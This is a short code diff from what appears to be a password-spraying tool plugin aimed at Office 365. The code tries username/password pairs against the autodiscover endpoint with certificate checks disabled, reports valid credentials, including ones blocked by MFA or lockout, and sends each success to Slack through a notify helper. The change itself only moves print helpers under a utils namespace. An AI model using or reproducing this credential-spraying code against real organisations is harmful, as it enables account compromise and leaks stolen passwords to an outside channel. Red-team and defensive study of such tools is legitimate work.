@@ -44,16 +44,16 @@ def o365_authenticate(url, username, password, useragent, pluginargs):
         r = requests.get("{}/autodiscover/autodiscover.xml".format(url), auth=(username, password), headers=headers, verify=False, timeout=30)
 
         if r.status_code == 200:
-            data_response['output'] = prGreen("[!] SUCCESS: {username}:{password}".format(username=username,password=password))
+            data_response['output'] = utils.prGreen("[!] SUCCESS: {username}:{password}".format(username=username,password=password))
             data_response['success'] = True
             utils.slacknotify(username, password)
         elif r.status_code == 456:
-            data_response['output'] = prGreen("[!]SUCCESS: {username}:{password} - 2FA or Locked".format(username=username,password=password))
+            data_response['output'] = utils.prGreen("[!]SUCCESS: {username}:{password} - 2FA or Locked".format(username=username,password=password))
             data_response['success'] = True
             utils.slackupdate("Credentials Valid but MFA enabled or account locked out!")
             utils.slacknotify(username, password)
         else:
-            data_response['output'] = prRed("FAILED: {username}:{password}".format(username=username,password=password))
+            data_response['output'] =  utils.prRed("FAILED: {username}:{password}".format(username=username,password=password))
             data_response['success'] = False
 
 
